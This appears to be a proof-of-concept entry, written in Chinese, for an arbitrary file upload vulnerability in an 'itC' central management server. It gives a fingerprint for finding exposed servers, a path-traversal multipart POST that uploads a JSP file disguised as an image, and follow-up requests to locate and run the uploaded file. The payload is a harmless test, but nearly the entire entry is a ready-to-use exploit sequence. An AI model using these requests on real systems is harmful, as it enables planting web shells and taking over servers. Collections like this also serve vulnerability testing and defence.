# itC中心管理服务器actionDetailTmpFile存在任意文件上传漏洞

- **系统**：itC　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/mt_res_v3/img/public/logo.ico"`
- **请求**：`POST /sdk/../photoAds/actionDetailTmpFile.do?text=1&pa_id=11&position=11 HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlA…`

**请求体 / payload**
```
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: image/jpeg
<%= "hello" %>
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
根据参数pa_id获取上传的文件名
POST /sdk/../photoAds/actionDetailTmpList.do?pa_id=11 HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 64
访问上传文件的路径
GET /photo_ads/a8a9d123-9d98-4cd2-9cad-31c88f4cb3c2.jsp HTTP/1.1
Host:
```
- **预期**：200　|　—